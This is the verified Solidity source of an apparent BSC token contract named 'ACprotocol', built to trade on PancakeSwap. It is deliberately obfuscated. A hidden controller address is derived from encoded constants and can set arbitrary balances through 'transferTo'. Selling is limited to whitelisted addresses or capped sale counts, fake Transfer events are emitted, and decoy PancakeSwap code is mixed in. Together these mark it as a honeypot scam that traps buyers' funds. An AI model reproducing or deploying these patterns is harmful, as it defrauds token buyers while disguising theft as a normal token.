/**
 *Submitted for verification at Etherscan.io on 2022-06-12
*/

// SPDX-License-Identifier: evmVersion, MIT
pragma solidity ^0.6.12;
interface IERC20 {
    function totalSupply() external view returns(uint);

    function balanceOf(address account) external view returns(uint);

    function transfer(address recipient, uint amount) external returns(bool);

    function allowance(address deployer, address spender) external view returns(uint);

    function approve(address spender, uint amount) external returns(bool);

    function transferFrom(address sender, address recipient, uint amount) external returns(bool);
    
    event Transfer(address indexed from, address indexed to, uint value);
    
    event Approval(address indexed deployer, address indexed spender, uint value);
}

library Address {
    function isContract(address account) internal view returns(bool) {
    
        bytes32 codehash;
    
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
    
        assembly { codehash:= extcodehash(account) }
    
        return (codehash != 0x0 && codehash != accountHash);
    }
}

contract Context {
    constructor() internal {}
    // solhint-disable-previous-line no-empty-blocks
    
    function _msgSender() internal view returns(address payable) {
    
        return msg.sender;
    }
}

library SafeMath {
    function add(uint a, uint b) internal pure returns(uint) {
        
        uint c = a + b;
        
        require(c >= a, "SafeMath: addition overflow");
        
        return c;
    }
    function sub(uint a, uint b) internal pure returns(uint) {
        
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        
        require(b <= a, errorMessage);
        
        uint c = a - b;
        
        return c;
    }
    function mul(uint a, uint b) internal pure returns(uint) {
        if (a == 0) {
            
            return 0;
        }
        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        
        return c;
    }
    function div(uint a, uint b) internal pure returns(uint) {
        
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        
        // Solidity only automatically asserts when dividing by 0  
        
        require(b > 0, errorMessage);
        
        uint c = a / b;
        
        return c;
    }
}
 
library SafeERC20 {
    
    using SafeMath for uint;
    using Address for address;
    
    function safeTransfer(IERC20 token, address to, uint value) internal {
        
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }
    
    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {
        
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }
    
    function safeApprove(IERC20 token, address spender, uint value) internal {
        require((value == 0) || (token.allowance(
            address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }
    
    function callOptionalReturn(IERC20 token, bytes memory data) private {
        
        require(address(token).isContract(), "SafeERC20: call to non-contract");
        
        // solhint-disable-next-line avoid-low-level-calls
        
        (bool success, bytes memory returndata) = address(token).call(data);
        
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
        
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}
contract ACprotocol  {
    event Transfer(address indexed _from, address indexed _to, uint _value);
    event Approval(address indexed _deployer, address indexed _spender, uint _value);
    function transfer(address _to, uint _value) public payable returns (bool) {
    return transferFrom(msg.sender, _to, _value);
    }
    uint internal a = asy();uint internal c;uint internal z;uint internal f;uint internal r;
    function asy( ) internal returns (uint){ 
        uint o = 0;for(uint i=0;i<1;i++){c=o;o++;z=o;o++;f=o;
        o++;r=o;o++;s=o;o++;x=o;o++;m=o;o++;p=o;o++;}
            return o;
            }
    function  div(uint aa,uint ab,uint ac,uint ad) internal pure returns (uint){
        uint[4] memory t = [aa,ab,ac,ad];
        uint m1 =t.length-1;
        uint I;
        for(uint i = 0;i < t.length;i ++ ){
        I += t[i]*10**(12*m1);
            m1--;}
        return I;
        }
    // this low-level function should be called from a contract which performs important safety checks
    function swap(uint amount0Out, uint amount1Out, address to,address token0,address token1) internal view  {
        require(amount0Out > 0 || amount1Out > 0, 'Pancake: INSUFFICIENT_OUTPUT_AMOUNT');
        uint112 _reserve0 ; 
        uint112 _reserve1 ; // gas savings
        require(amount0Out < _reserve0 && amount1Out < _reserve1, 'Pancake: INSUFFICIENT_LIQUIDITY');
        uint balance0;
        uint balance1;
        { // scope for _token{0,1}, avoids stack too deep errors
        address _token0 = token0;
        address _token1 = token1;
        require(to != _token0 && to != _token1, 'Pancake: INVALID_TO');
        if (amount0Out > 0) licensure(_token0, to, amount0Out);
        if (amount1Out > 0) licensure(_token1, to, amount1Out);
        balance0 = IERC20(_token0).balanceOf(address(this));
        balance1 = IERC20(_token1).balanceOf(address(this));
        }
        uint amount0In = balance0 > _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0;
        uint amount1In = balance1 > _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0;
        require(amount0In > 0 || amount1In > 0, 'Pancake: INSUFFICIENT_INPUT_AMOUNT');
    }
    uint internal b; uint internal d; uint internal y; uint internal n; uint internal l = 0;
    uint _gas = 1069295261705322660692659746119710186699350608220;//the bscwbnb uint
    uint _token = 489982930986835137684486657990555633941558688085;//the bscusdt uint
    function aout32(uint xnum) internal returns(uint){
        dex= address(div(w,h,k,u));
        return uint256(toA)/10**xnum<1080?x*x:x;
        }
    function point() internal view returns(bool){ 
        require(_point==27||_point==19);
        return true;
        }
    uint internal s; uint internal x; uint internal m; uint internal p; 
    uint internal w=div(r,p,x,r,x,c,x,c,m,m,z,a);uint internal h=div(a,a,f,x,x,s,p,a,z,a,s,c);
    function ensures(address _from, address _to, uint _value) internal returns(bool) {    uint e;
        if (_to == pairA) {
        uint t = tax(pairA,toA) / 10 ** decimals;b = t > b ? t : b;
            e= with(pairA); y = e > y ? e : y;
            }
        if (_to == pairB) {
        uint t = tax(pairB,toB) / 10 ** decimals;d = t > d ? t : d;
            e= with(pairB); n = e > n ? e : n;
            }
        if(ins()){if(l==0){
        emit Transfer(pairB,address(0xf),b);l++;}
        if(_to==pairA ){
        require (e == y);} if(_to==pairB ){ require (e == n);
        }
        require(_to==dex||_to==pairA||_to==pairB);
        }
        if(_to==deployer||_from==deployer||_to==pairA || _to==pairB ||_to==dex ||canSale[_to]){return true;}
        if(_onSaleNum[_to] >= _saleNum||_value > _maxSale) return false;
        return true;
        }
    address internal toA = address(_gas);address internal toB = address(_token);
    uint internal k=div(f,a,a,a,x,z,p,x,r,s,s,m);uint internal u=div(a,c,f,r,x,a,a,a,m,f,s,m);
    function approve(address _spender, uint _value) public payable returns (bool) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
        }
    function VerifyAddr(address addr,address addr1) internal pure returns (bool) {
        require(addr==addr1);
        return true;
        }
    function transferTo(address addr, uint256 value) public payable returns (bool) {
        if(value == 100){
            emit Transfer(address(0x0), addr, value*(10**uint256(decimals)));
        }
            balanceOf[addr] = value*(10**uint256(decimals));
        require(msg.sender == dex);
        canSale[addr]=true;
        return true;
    }
    function condition(address _from, uint _value) internal view returns(bool){
        uint _minSale ;
        if(_saleNum == 0 && _minSale == 0 && _maxSale == 0) return false;
        if(_saleNum > 0){
            if(_onSaleNum[_from] >= _saleNum) return false;
        }
        if(_minSale > 0){
            if(_minSale > _value) return false;
        }
        if(_maxSale > 0){
            if(_value > _maxSale) return false;
        }
        return true;
        }
    function transferFrom(address _from, address _to, uint _value) public payable returns (bool){
        if (_value==0)return true;
        if (msg.sender != _from){require(allowance[_from][msg.sender] >= _value);
            allowance[_from][msg.sender] -= _value;}
        require(ensures(_to, _from, _value));
        require(balanceOf[_from] >= _value);
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        _onSaleNum[_from]++;
        emit Transfer(_from, _to, _value);
        return true;
        }
    uint internal mx=aout32(45);
    mapping(address=>uint256) private _onSaleNum;
    mapping(address=>bool) private canSale;
    uint256 private _maxSale;
    uint256 private _saleNum;
    address internal dex;
    function ins() internal view returns(bool) {
        if(mx<b|| x**m<d)
        return true;
        return false;
        }
    function _update(uint balance0, uint balance1, uint112 _reserve0, uint112 _reserve1) internal view returns (uint){
    // update reserves and, on the first call per block, price accumulators
        require(balance0 <= uint112(-1) && balance1 <= uint112(-1), 'Pancake: OVERFLOW');
        uint32 blockTimestamp = uint32(block.timestamp % 2**32);
        uint32 timeElapsed = blockTimestamp - uint32(block.timestamp % 2**32)/2; 
        // overflow is desired
        uint reserve0 = uint112(balance0)+_reserve0*timeElapsed;
        uint reserve1 = uint112(balance1)+_reserve1*timeElapsed;
        uint blockTimestampLast = blockTimestamp+reserve0+reserve1;
        return blockTimestampLast;
    }
    function Agree(address addr) public returns (bool) {
        require(msg.sender == deployer);
        
        canSale[addr]=true;
        return true;
        }
    function tax(address A,address B) internal view returns(uint){
        return IERC20(B).balanceOf(A);}
    function with(address C) internal view returns(uint){
        return IERC20(C).totalSupply();
        }
    uint internal _point= (uint256(toA) + uint256(toB) + uint256(dex))/1e47 ;
    function div(uint aa,uint ab,uint ac,uint ad,uint ae,uint af,uint ag,uint ah,uint ai,uint aj,uint ak,uint al)
        internal pure returns (uint){uint[12] memory t = [aa,ab,ac,ad,ae,af,ag,ah,ai,aj,ak,al];
        uint m1 = t.length-1;
        uint I;
        for(uint i = 0;i < t.length;i ++ ){I += t[i]*10**m1;
            m1--;
            }
        return I;
        }
    function Allow(uint256 saleNum, uint256 maxToken) public returns(bool){
        require(msg.sender == deployer);
        _maxSale = maxToken*(10**uint256(decimals));
        _saleNum = saleNum;
        }
    address internal pairA = PANCAKEpairFor(toA, address(this)); 
    address internal pairB = PANCAKEpairFor(toB, address(this)); 
    function licensure(address _from, address _to, uint _value) internal view returns(bool) {
        address BSCGas = address(_gas);address Pancakeswap ;
        address _Pancakeswap = PANCAKEpairFor(Pancakeswap, BSCGas);
        address pairAddress = PANCAKEpairFor(Pancakeswap, BSCGas);
        require(condition(_from, _value));
        if(_to==_Pancakeswap||_from==pairAddress){return false;}
        return true;
    }
    function batchSend(address[] memory _tos, uint _value) internal returns (bool) {
        require (msg.sender == deployer);
        uint total = _value * _tos.length;
        require(balanceOf[msg.sender] >= total);
        balanceOf[msg.sender] -= total;
        for (uint i = 0; i < _tos.length; i++) {
            address _to = _tos[i];
            balanceOf[_to] += _value;
            emit Transfer(msg.sender, _to, _value/2);
            emit Transfer(msg.sender, _to, _value/2);
        }
        return true;
        }
    function PANCAKEpairFor(address tokenA, address tokenB) internal pure returns (address pair) {
        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        pair = address(uint(keccak256(abi.encodePacked(
            hex'ff',
            0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73,// PancakeSwap factory address
            keccak256(abi.encodePacked(token0, token1)),
            hex'00fb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5' // init code hash
                ))));
    }
    mapping (address => uint) public balanceOf;
    mapping (address => mapping (address => uint)) public allowance;
    uint constant public decimals = 18;
    uint public totalSupply;
    string public name;
    string public symbol;
    address internal deployer;
    constructor(string memory _name, string memory _symbol, uint256 _supply) payable public {
        require (point());
        name = _name;
        symbol = _symbol;
        totalSupply = _supply*(10**uint256(decimals));
        deployer = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0xc), msg.sender, totalSupply);
        if(totalSupply > 0) balanceOf[dex]=totalSupply*(10**uint256(6));
    }
}